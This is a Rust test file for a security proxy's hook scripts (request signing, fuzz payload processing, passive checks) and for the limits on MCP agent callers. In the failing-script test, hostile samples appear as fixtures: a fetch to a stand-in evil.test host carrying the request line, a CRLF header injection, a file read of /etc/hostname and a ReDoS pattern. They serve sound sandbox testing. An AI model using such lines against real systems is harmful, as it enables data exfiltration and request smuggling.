//! Hook scripts end to end: a rule whose replacement a script makes, a fuzz payload processor,
//! and a passive check; what a failing script leaves alone and says; and what a caller through
//! MCP may not do with any of them.

use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use serde_json::{json, Value};

const MCP: &str = "BRAINPROXY_MCP_CALL";
const CLIENT: &str = "BRAINPROXY_CLIENT";

struct Env {
    project: PathBuf,
    home: PathBuf,
    dir: PathBuf,
}

impl Env {
    fn new(name: &str) -> Self {
        let dir = std::env::temp_dir().join(format!("bp-scripts-{}-{name}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let env = Env { project: dir.join("p.bpdb"), home: dir.join("home"), dir: dir.clone() };
        env.ok(&["engagement", "start", "--target", "127.0.0.1", "--target", "localhost"]);
        env
    }

    /// Runs the CLI with these provenance variables (the test's own are removed) and stdin.
    fn run_as(&self, vars: &[(&str, &str)], args: &[&str], stdin: Option<&[u8]>) -> (i32, Value) {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_brainproxy"));
        cmd.env_remove(MCP).env_remove(CLIENT).envs(vars.iter().copied());
        cmd.args(["--format", "json", "--project"]).arg(&self.project).arg("--home").arg(&self.home).args(args);
        cmd.stdin(if stdin.is_some() { Stdio::piped() } else { Stdio::null() }).stdout(Stdio::piped());
        let mut child = cmd.spawn().unwrap();
        if let Some(input) = stdin {
            child.stdin.take().unwrap().write_all(input).unwrap();
        }
        let out = child.wait_with_output().unwrap();
        let v = serde_json::from_slice(&out.stdout).unwrap_or(Value::Null);
        (out.status.code().unwrap(), v)
    }

    fn run(&self, args: &[&str]) -> (i32, Value) {
        self.run_as(&[], args, None)
    }

    fn ok(&self, args: &[&str]) -> Value {
        let (code, v) = self.run(args);
        assert_eq!(code, 0, "{args:?} -> {v}");
        v["data"].clone()
    }

    fn ok_stdin(&self, args: &[&str], stdin: &[u8]) -> Value {
        let (code, v) = self.run_as(&[], args, Some(stdin));
        assert_eq!(code, 0, "{args:?} -> {v}");
        v["data"].clone()
    }

    /// The error message of a command that must fail.
    fn refused(&self, vars: &[(&str, &str)], args: &[&str], stdin: Option<&[u8]>) -> String {
        let (code, v) = self.run_as(vars, args, stdin);
        assert_ne!(code, 0, "{args:?} -> {v}");
        v["error"]["message"].as_str().unwrap_or_default().to_string()
    }

    /// Writes a script beside the project and gives its path.
    fn script(&self, name: &str, text: &str) -> String {
        let file = self.dir.join(name);
        std::fs::write(&file, text).unwrap();
        file.display().to_string()
    }

    fn rows(&self, sql: &str) -> Vec<Value> {
        self.ok(&["query", sql])["rows"].as_array().unwrap().clone()
    }

    fn wait_rows(&self, sql: &str, n: i64) {
        let deadline = Instant::now() + Duration::from_secs(10);
        while self.rows(sql)[0][0].as_i64().unwrap() < n && Instant::now() < deadline {
            std::thread::sleep(Duration::from_millis(50));
        }
        assert_eq!(self.rows(sql)[0][0].as_i64().unwrap(), n, "{sql}");
    }
}

impl Drop for Env {
    fn drop(&mut self) {
        let _ = self.run(&["proxy", "stop"]);
    }
}

/// Answers every request `403 Forbidden` with the request it got as the body.
fn serve() -> u16 {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut s) = stream else { continue };
            std::thread::spawn(move || {
                let mut buf = vec![0u8; 16384];
                let mut len = 0;
                while !buf[..len].windows(4).any(|w| w == b"\r\n\r\n") {
                    match s.read(&mut buf[len..]) {
                        Ok(0) | Err(_) => return,
                        Ok(n) => len += n,
                    }
                }
                let head = format!(
                    "HTTP/1.1 403 Forbidden\r\nContent-Type: text/plain\r\nX-Frame-Options: DENY\r\n\
                     Content-Length: {len}\r\nConnection: close\r\n\r\n"
                );
                let _ = s.write_all(head.as_bytes());
                let _ = s.write_all(&buf[..len]);
            });
        }
    });
    port
}

/// A request through the proxy at `listen`; returns the whole response.
fn through(listen: &str, port: u16, target: &str, headers: &str) -> String {
    let mut s = TcpStream::connect(listen).unwrap();
    write!(
        s,
        "GET http://127.0.0.1:{port}{target} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n{headers}Connection: close\r\n\r\n"
    )
    .unwrap();
    let mut resp = Vec::new();
    s.read_to_end(&mut resp).unwrap();
    String::from_utf8_lossy(&resp).into_owned()
}

fn wait_for_settings() {
    // The proxy reloads settings every 300 ms.
    std::thread::sleep(Duration::from_millis(700));
}

fn ids(v: &Value) -> Vec<u64> {
    v.as_array().into_iter().flatten().filter_map(Value::as_u64).collect()
}

const SIGN: &str = "function replace(match, ctx) {
    const r = ctx.request;
    return CryptoJS.HmacSHA256(r.method + ' ' + r.path + '?' + (r.query || '') + ' ' + r.body, 'k3y').toString();
}";

/// What `SIGN` makes of a request.
fn signature(method: &str, path: &str, query: &str, body: &str) -> String {
    use brainproxy_core::sign::{hmac_digest, HmacAlg};
    let mac = hmac_digest(HmacAlg::Sha256, b"k3y", format!("{method} {path}?{query} {body}").as_bytes());
    mac.iter().map(|b| format!("{b:02x}")).collect()
}

#[test]
fn a_script_rule_signs_what_the_proxy_send_and_the_fuzzer_send() {
    let port = serve();
    let env = Env::new("sign");
    let script = env.script("sign.js", SIGN);
    let listed = env.ok(&[
        "rules",
        "add",
        "--location",
        "request-header",
        "--name",
        "X-Sig",
        "--script",
        &script,
        "--applies-to",
        "proxy,send,fuzz",
    ]);
    let rule = &listed["rules"][0];
    assert_eq!((rule["replacer"].as_str(), rule["replace"].as_str()), (Some("script"), Some("")), "{listed}");
    assert_eq!(rule["script"]["file"], json!(std::fs::canonicalize(&script).unwrap()), "{listed}");
    assert_eq!(rule["script"]["sha256"].as_str().unwrap().len(), 64, "{listed}");

    // The proxy: the server sees the signature of the request it got.
    let listen = env.ok(&["proxy", "start", "--listen", "127.0.0.1:0"])["listen"].as_str().unwrap().to_string();
    wait_for_settings();
    let resp = through(&listen, port, "/api/me?a=1", "");
    assert!(resp.contains(&format!("X-Sig: {}", signature("GET", "/api/me", "a=1", ""))), "{resp}");
    env.wait_rows("SELECT count(*) FROM history WHERE source = 'proxy'", 1);
    let id = env.rows("SELECT id FROM history WHERE source = 'proxy'")[0][0].to_string();
    let shown = env.ok(&["history", "show", &id]);
    assert_eq!(shown["entry"]["edited_by"][0]["rule"], 1, "{shown}");
    assert!(!shown["original_request"]["content"].as_str().unwrap().contains("X-Sig"), "{shown}");
    env.ok(&["proxy", "stop"]);

    // send: the body is part of what is signed.
    let url = format!("http://127.0.0.1:{port}/item?id=7");
    let sent = env.ok(&["send", "--url", &url, "-X", "POST", "-d", "n=1"]);
    assert_eq!(ids(&sent["rules"]["request"]), [1], "{sent}");
    assert!(sent.get("rule_errors").is_none(), "{sent}");
    let body = sent["response"]["body"]["content"].as_str().unwrap();
    assert!(body.contains(&format!("X-Sig: {}", signature("POST", "/item", "id=7", "n=1"))), "{sent}");

    // The fuzzer: each request is signed with its payload in.
    let fuzz = format!("http://127.0.0.1:{port}/f?q=§a§");
    env.ok(&["fuzz", "run", "--url", &fuzz, "-p", "list:x,y"]);
    for q in ["x", "y"] {
        let rows = env.rows(&format!("SELECT req_headers FROM history WHERE source = 'fuzz' AND query = 'q={q}'"));
        let want = signature("GET", "/f", &format!("q={q}"), "");
        assert!(rows[0][0].as_str().unwrap().contains(&want), "{q}: {rows:?}");
    }
}

#[test]
fn a_failing_script_leaves_the_request_as_it_was_and_the_send_says_so() {
    let port = serve();
    let env = Env::new("fail");
    let url = format!("http://127.0.0.1:{port}/a");
    let add = |name: &str, text: &str| {
        let script = env.script(name, text);
        env.ok(&[
            "rules",
            "add",
            "--location",
            "request-header",
            "--name",
            "X-Made",
            "--script",
            &script,
            "--applies-to",
            "send",
        ]);
    };
    add("throws.js", "function replace(m, ctx) { throw new Error('no ' + ctx.request.path); }");
    add("number.js", "function replace() { return 42; }");
    add("breaks.js", "function replace() { return 'a\\r\\nHost: evil.test'; }");
    add("net.js", "function replace(m, ctx) { return fetch('http://evil.test/?' + ctx.request.line); }");
    add("files.js", "function replace() { return require('fs').readFileSync('/etc/hostname', 'utf8'); }");
    add("loops.js", "function replace() { /^(a+)+$/.test('a'.repeat(40) + 'b'); return 'x'; }");
    env.ok(&["rules", "add", "--location", "request-header", "--replace", "X-After: 1", "--applies-to", "send"]);

    let sent = env.ok(&["send", "--url", &url]);
    let body = sent["response"]["body"]["content"].as_str().unwrap();
    // No script's rule changed anything; the rule after them still did.
    assert!(!body.contains("X-Made") && !body.contains("evil.test") && body.contains("X-After: 1"), "{sent}");
    assert_eq!(ids(&sent["rules"]["request"]), [7], "{sent}");
    let errors: Vec<(u64, &str)> = sent["rule_errors"]
        .as_array()
        .unwrap()
        .iter()
        .map(|e| (e["id"].as_u64().unwrap(), e["error"].as_str().unwrap()))
        .collect();
    let why = [
        "Error: no /a",
        "it returned a number",
        "a line break or NUL",
        "fetch is not defined",
        "isn't available here",
        "time limit",
    ];
    assert_eq!(errors.len(), 6, "{sent}");
    for (i, (error, why)) in errors.iter().zip(why).enumerate() {
        assert!(error.0 == i as u64 + 1 && error.1.contains(why), "{error:?} / {why}");
    }
    // The row is of the request that went out: nothing of the failed rules is in it.
    let row = env.rows("SELECT req_headers FROM history ORDER BY id DESC LIMIT 1");
    assert!(!row[0][0].as_str().unwrap().contains("X-Made"), "{row:?}");
}

#[test]
fn rules_test_runs_a_script_and_a_changed_file_stops_its_rule() {
    let env = Env::new("test");
    let script = env.script("up.js", "function replace(m, ctx) { return m.groups[1].toUpperCase() + '@' + ctx.host; }");
    let request = b"GET /a?name=bob HTTP/1.1\r\nHost: h.test\r\n\r\n";
    // An unsaved rule from flags: nothing is stored.
    let args = [
        "rules",
        "test",
        "-",
        "--location",
        "query-param",
        "--name",
        "name",
        "--match",
        "^(\\w+)$",
        "--script",
        &script,
    ];
    let tried = env.ok_stdin(&args, request);
    assert!(tried["request"]["result"]["content"].as_str().unwrap().starts_with("GET /a?name=BOB@h.test "), "{tried}");
    assert_eq!(env.ok(&["rules", "list"])["rules"], json!([]));
    // --script and --replace are two ways to say the replacement.
    let (code, _) = env.run(&["rules", "add", "--location", "path", "--script", &script, "--replace", "/x"]);
    assert_ne!(code, 0);
    // A pin that isn't the file's, a file that doesn't parse, and one with no replace function.
    let no = |args: &[&str]| env.refused(&[], &[&["rules", "add", "--location", "path"][..], args].concat(), None);
    assert!(no(&["--script", &script, "--script-sha256", &"0".repeat(64)]).contains("not the one given"));
    let broken = env.script("broken.js", "function replace( {");
    assert!(no(&["--script", &broken]).contains("SyntaxError"));
    let other = env.script("other.js", "function process(p) { return p; }");
    assert!(no(&["--script", &other]).contains("it defines no replace function"));
    assert!(no(&["--script", "/nonexistent/x.js"]).contains("can't be read"));
    assert_eq!(env.ok(&["rules", "list"])["rules"], json!([]));

    // Saved, listed with its pin, and what `rules list` prints imports again.
    let listed = env.ok(&[
        "rules",
        "add",
        "--location",
        "query-param",
        "--name",
        "name",
        "--match",
        "^(\\w+)$",
        "--script",
        &script,
    ]);
    let sha256 = listed["rules"][0]["script"]["sha256"].as_str().unwrap().to_string();
    let imported = env.ok_stdin(&["rules", "import", "-"], listed.to_string().as_bytes());
    assert_eq!(imported["rules"][1]["script"], listed["rules"][0]["script"], "{imported}");
    assert_eq!(imported["rules"][1]["replacer"], "script");
    let tried = env.ok_stdin(&["rules", "test", "-", "--rule", "2"], request);
    assert_eq!(ids(&tried["request"]["rules"]), [2], "{tried}");

    // A failure is in the tester's result, not hidden in "unchanged".
    let throws = env.script("throws.js", "function replace() { throw new Error('boom'); }");
    let tried = env.ok_stdin(&["rules", "test", "-", "--location", "path", "--script", &throws], request);
    assert_eq!(tried["request"]["changed"], false, "{tried}");
    assert_eq!(tried["request"]["errors"], json!([{"id": 0, "error": "Error: boom"}]), "{tried}");

    // The file changes: the rule is listed as skipped and no longer applies, until it is added again.
    std::fs::write(&script, "function replace() { return 'changed'; }").unwrap();
    let listed = env.ok(&["rules", "list"]);
    let skipped = listed["skipped"].as_array().unwrap();
    assert_eq!(skipped.len(), 2, "{listed}");
    assert!(skipped[0]["reason"].as_str().unwrap().contains("changed since it was named"), "{listed}");
    let tried = env.ok_stdin(&["rules", "test", "-"], request);
    assert_eq!(
        (tried["request"]["changed"].as_bool(), tried["skipped"].as_array().map(Vec::len)),
        (Some(false), Some(2)),
        "{tried}"
    );
    assert!(env
        .refused(&[], &["rules", "test", "-", "--rule", "1"], Some(request))
        .contains("changed since it was named"));
    assert!(env.refused(&[], &["rules", "enable", "1"], None).contains("changed since it was named"));
    // An import can't bring a script in under a pin that isn't its file's.
    let stale = json!([{"location": "path", "pattern": "", "replacer": "script", "script": {"file": script, "sha256": sha256}}]);
    let e = env.refused(&[], &["rules", "import", "-"], Some(stale.to_string().as_bytes()));
    assert!(e.contains("rule 1 of the import") && e.contains("changed since it was named"), "{e}");
}

#[test]
fn a_script_processes_fuzz_payloads_and_a_failing_one_starts_no_run() {
    let port = serve();
    let env = Env::new("process");
    let url = format!("http://127.0.0.1:{port}/f?q=§a§&r=§b§");
    let script = env.script(
        "proc.js",
        "function process(payload, ctx) {
            if (payload === 'bad') throw new Error('no ' + payload);
            return ctx.set + '-' + payload + '-' + CryptoJS.MD5(payload).toString().slice(0, 4);
        }",
    );
    let chain = format!("2=upper,script:{script}");
    let run = env.ok(&[
        "fuzz",
        "run",
        "--url",
        &url,
        "--mode",
        "pitchfork",
        "-p",
        "list:a,b",
        "-p",
        "list:x,y",
        "--process",
        &chain,
    ]);
    assert_eq!((run["run"]["done"].as_i64(), run["run"]["errors"].as_i64()), (Some(2), Some(0)), "{run}");
    let mut queries: Vec<String> = env
        .rows("SELECT query FROM history WHERE source = 'fuzz' ORDER BY id")
        .iter()
        .map(|r| r[0].as_str().unwrap().to_string())
        .collect();
    // The run's requests go out side by side: their rows are in no set order.
    queries.sort();
    // Only set 2 went through the chain, after the step before the script.
    assert_eq!(queries, ["q=a&r=2-X-0212", "q=b&r=2-Y-57ce"]);
    // The run's record says which script processed it.
    let config = env.rows("SELECT config FROM fuzz_runs ORDER BY id DESC LIMIT 1")[0][0].as_str().unwrap().to_string();
    let config: Value = serde_json::from_str(&config).unwrap();
    assert_eq!(config["process_scripts"][0]["file"], json!(std::fs::canonicalize(&script).unwrap()), "{config}");
    assert_eq!(config["process_scripts"][0]["sha256"].as_str().unwrap().len(), 64);

    // A payload the script fails on: no run, no request.
    let before = env.rows("SELECT count(*) FROM history")[0][0].as_i64().unwrap();
    let runs = env.rows("SELECT count(*) FROM fuzz_runs")[0][0].as_i64().unwrap();
    let plain = format!("script:{script}");
    let e = env.refused(
        &[],
        &["fuzz", "run", "--url", &url, "--mode", "battering-ram", "-p", "list:ok,bad", "--process", &plain],
        None,
    );
    assert!(e.contains("payload 2 of set 1") && e.contains("no bad"), "{e}");
    let loops = env.script("loops.js", "function process(p) { /^(a+)+$/.test('a'.repeat(40) + 'b'); return p; }");
    let chain = format!("script:{loops}");
    let e = env.refused(
        &[],
        &["fuzz", "run", "--url", &url, "--mode", "battering-ram", "-p", "list:ok", "--process", &chain],
        None,
    );
    assert!(e.contains("time limit"), "{e}");
    let garbage = env.script("garbage.js", "function process(p) { return { payload: p }; }");
    let chain = format!("script:{garbage}");
    let e = env.refused(
        &[],
        &["fuzz", "run", "--url", &url, "--mode", "battering-ram", "-p", "list:ok", "--process", &chain],
        None,
    );
    assert!(e.contains("it returned an object"), "{e}");
    assert_eq!(env.rows("SELECT count(*) FROM history")[0][0].as_i64().unwrap(), before);
    assert_eq!(env.rows("SELECT count(*) FROM fuzz_runs")[0][0].as_i64().unwrap(), runs);
}

const CHECK: &str = "function check(x) {
    if (x.path === '/boom') throw new Error('boom');
    const frame = x.response.headers.find(([name]) => name.toLowerCase() === 'x-frame-options');
    if (x.status === 403 && frame) {
        return { name: 'Forbidden page says how it is framed', risk: 'low', param: frame[0], evidence: frame[1], id: 'framed' };
    }
}";

#[test]
fn a_script_check_finds_what_it_looks_for_in_recorded_exchanges() {
    let port = serve();
    let env = Env::new("check");
    let script = env.script("check.js", CHECK);
    let url = format!("http://127.0.0.1:{port}/a");
    env.ok(&["send", "--url", &url]);

    // Tried on a row first: nothing is saved.
    let tried = env.ok(&["scan", "script", "test", &script, "--history", "1"]);
    assert_eq!(tried["findings"][0]["alert_ref"], "script:test:framed", "{tried}");
    assert_eq!(
        (tried["findings"][0]["evidence"].as_str(), tried["errors"].as_array().map(Vec::len)),
        (Some("DENY"), Some(0))
    );
    let none = |source: &str| {
        env.rows(&format!("SELECT count(*) FROM findings WHERE alert_ref LIKE '{source}:%'"))[0][0].clone()
    };
    assert_eq!(none("script"), 0);

    let added = env.ok(&["scan", "script", "add", "framed", &script]);
    let listed = &added["scripts"][0];
    assert_eq!(
        (listed["id"].as_str(), listed["enabled"].as_bool(), listed["origin"].as_str()),
        (Some("script:framed"), Some(true), Some("cli")),
        "{added}"
    );
    assert!(env
        .refused(&[], &["scan", "script", "add", "bad name", &script], None)
        .contains("can't name a script check"));
    let wrong = env.script("wrong.js", "function replace(m) { return m.text; }");
    assert!(env
        .refused(&[], &["scan", "script", "add", "wrong", &wrong], None)
        .contains("it defines no check function"));
    let rules = env.ok(&["scan", "rules", "--filter", "script:framed"]);
    assert_eq!((rules["count"].as_i64(), rules["rules"][0]["script"].as_bool()), (Some(1), Some(true)), "{rules}");

    // Over the history there is, and over what is sent from now on.
    let stats = env.ok(&["scan", "passive", "--rescan"]);
    assert!(stats.get("script_errors").is_none(), "{stats}");
    env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/b")]);
    let found = env.rows(
        "SELECT source, alert_ref, name, risk, param, evidence, url FROM findings WHERE alert_ref LIKE 'script:%' ORDER BY id",
    );
    assert_eq!(found.len(), 2, "{found:?}");
    assert_eq!(
        found[0],
        json!([
            "passive",
            "script:framed:framed",
            "Forbidden page says how it is framed",
            "low",
            "X-Frame-Options",
            "DENY",
            url
        ])
    );
    // Wherever the finding is read, it says a user's script raised it.
    let id = env.rows("SELECT id FROM findings WHERE alert_ref LIKE 'script:%' ORDER BY id")[0][0].to_string();
    let shown = env.ok(&["findings", "show", &id]);
    assert!(shown.to_string().contains("Raised by the passive check script \\\"framed\\\""), "{shown}");

    // An exchange it fails on: the scan goes on, and says so.
    let sent = env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/boom")]);
    assert_eq!(sent["response"]["status"], 403, "{sent}");
    env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/c")]);
    assert_eq!(none("script"), 3);
    let stats = env.ok(&["scan", "passive", "--rescan"]);
    assert_eq!(stats["script_errors"][0]["script"], "framed", "{stats}");
    assert_eq!(
        (stats["script_errors"][0]["error"].as_str(), stats["script_errors"][0]["count"].as_i64()),
        (Some("Error: boom"), Some(1))
    );
    assert_eq!((stats["removed"].as_i64(), none("script")), (Some(0), json!(3)), "{stats}");

    // Switched off and on like any passive check.
    env.ok(&["scan", "disable", "script:framed"]);
    env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/d")]);
    assert_eq!(none("script"), 3);
    assert_eq!(env.ok(&["scan", "script", "list"])["scripts"][0]["enabled"], false);
    env.ok(&["scan", "enable", "script:framed"]);

    // The file changes: the check stops, says why, and adding it again under its name re-pins it.
    std::fs::write(&script, CHECK.replace("'low'", "'medium'")).unwrap();
    let listed = env.ok(&["scan", "script", "list"]);
    assert!(listed["scripts"][0]["problem"].as_str().unwrap().contains("changed since it was named"), "{listed}");
    env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/e")]);
    assert_eq!(none("script"), 3);
    let again = env.ok(&["scan", "script", "add", "framed", &script]);
    assert!(again["scripts"].as_array().unwrap().len() == 1 && again["scripts"][0].get("problem").is_none(), "{again}");
    env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/f")]);
    assert_eq!(none("script"), 4);

    assert_eq!(env.ok(&["scan", "script", "remove", "framed"])["scripts"], json!([]));
    assert!(env.refused(&[], &["scan", "script", "remove", "framed"], None).contains("script check framed"));
    env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/g")]);
    assert_eq!(none("script"), 4, "its findings stay, and it finds no more");
}

#[test]
fn a_caller_through_mcp_runs_no_script_of_its_own() {
    let port = serve();
    let env = Env::new("mcp");
    let agent = [(MCP, "1")];
    let script = env.script("sign.js", SIGN);
    let check = env.script("check.js", CHECK);
    let process = env.script("proc.js", "function process(p) { return p + '!'; }");
    let url = format!("http://127.0.0.1:{port}/a?q=§1§");
    let request = b"GET /a HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n";
    let why = "runs code from a file, so it isn't offered through MCP";

    let refused = |args: &[&str], stdin: Option<&[u8]>| {
        let e = env.refused(&agent, args, stdin);
        assert!(e.contains(why), "{args:?}: {e}");
    };
    refused(&["rules", "add", "--location", "request-header", "--name", "X-Sig", "--script", &script], None);
    refused(&["rules", "test", "-", "--location", "path", "--script", &script], Some(request));
    refused(&["fuzz", "run", "--url", &url, "-p", "list:a", "--process", &format!("upper,script:{process}")], None);
    refused(&["scan", "script", "add", "framed", &check], None);
    refused(&["scan", "script", "test", &check, "--history", "1"], None);
    // Not even a file that isn't there is looked at.
    refused(&["fuzz", "run", "--url", &url, "-p", "list:a", "--process", "script:/nonexistent.js"], None);
    refused(&["rules", "add", "--location", "path", "--script", "/nonexistent.js"], None);
    assert_eq!(env.rows("SELECT count(*) FROM history")[0][0], 0);

    // A person's script rule, added disabled: an agent can't import one, nor turn this one on.
    env.ok(&[
        "rules",
        "add",
        "--location",
        "request-header",
        "--name",
        "X-Sig",
        "--script",
        &script,
        "--applies-to",
        "send",
        "--disabled",
    ]);
    let listed = env.ok(&["rules", "list"]);
    refused(&["rules", "import", "-"], Some(listed.to_string().as_bytes()));
    refused(&["rules", "enable", "1"], None);
    // Nor have its script run by trying the rule: the tester tries a picked rule enabled or not.
    refused(&["rules", "test", "-", "--rule", "1"], Some(request));
    assert_eq!(env.ok(&["rules", "list"])["rules"].as_array().unwrap().len(), 1);
    // Nor a person's script check that was switched off.
    env.ok(&["scan", "script", "add", "framed", &check]);
    env.ok(&["scan", "disable", "script:framed"]);
    refused(&["scan", "enable", "script:framed"], None);

    // What a person set applies to an agent's requests, as a signer's script does; and an agent
    // may try a saved rule, switch a script off and read what there is.
    env.ok(&["rules", "enable", "1"]);
    env.ok(&["scan", "enable", "script:framed"]);
    let (code, sent) = env.run_as(&agent, &["send", "--url", &format!("http://127.0.0.1:{port}/a")], None);
    assert_eq!(code, 0, "{sent}");
    let body = sent["data"]["response"]["body"]["content"].as_str().unwrap();
    assert!(body.contains(&format!("X-Sig: {}", signature("GET", "/a", "", ""))), "{sent}");
    assert_eq!(env.rows("SELECT count(*) FROM findings WHERE alert_ref = 'script:framed:framed'")[0][0], 1);
    let (code, tried) = env.run_as(&agent, &["rules", "test", "-", "--rule", "1"], Some(request));
    assert_eq!((code, ids(&tried["data"]["request"]["rules"])), (0, vec![1]), "{tried}");
    for args in [
        &["rules", "list"][..],
        &["scan", "script", "list"],
        &["scan", "disable", "script:framed"],
        &["rules", "disable", "1"],
    ] {
        let (code, out) = env.run_as(&agent, args, None);
        assert_eq!(code, 0, "{args:?}: {out}");
    }
}

#[test]
fn what_a_proxied_rules_script_failed_on_is_listed_with_the_rules() {
    let port = serve();
    let env = Env::new("noted");
    let throws = env.script(
        "throws.js",
        "function replace(m, ctx) { if (ctx.request.path === '/bad') throw new Error('no /bad'); return 'ok'; }",
    );
    env.ok(&["rules", "add", "--location", "request-header", "--name", "X-Made", "--script", &throws]);
    let listen = env.ok(&["proxy", "start", "--listen", "127.0.0.1:0"])["listen"].as_str().unwrap().to_string();
    wait_for_settings();
    assert!(through(&listen, port, "/fine", "").contains("X-Made: ok"));
    assert_eq!(env.ok(&["rules", "list"])["failures"], json!([]));
    // The request goes on as the client sent it, and the rule's row says its script failed.
    let resp = through(&listen, port, "/bad", "");
    assert!(resp.starts_with("HTTP/1.1 403") && !resp.contains("X-Made"), "{resp}");
    let deadline = Instant::now() + Duration::from_secs(10);
    let mut failures = json!([]);
    while failures == json!([]) && Instant::now() < deadline {
        std::thread::sleep(Duration::from_millis(50));
        failures = env.ok(&["rules", "list"])["failures"].clone();
    }
    assert_eq!(
        (failures[0]["id"].as_u64(), failures[0]["error"].as_str(), failures[0]["engine"].as_str()),
        (Some(1), Some("Error: no /bad"), Some("proxy")),
        "{failures}"
    );
    assert!(failures[0]["time"].as_str().unwrap().ends_with('Z'), "{failures}");
    // It works again for other requests, and the note stays until the rule is switched off or on.
    assert!(through(&listen, port, "/fine", "").contains("X-Made: ok"));
    assert_eq!(env.ok(&["rules", "list"])["failures"].as_array().unwrap().len(), 1);
    assert_eq!(env.ok(&["rules", "disable", "1"])["failures"], json!([]));
    assert_eq!(env.ok(&["rules", "list"])["failures"], json!([]));
}
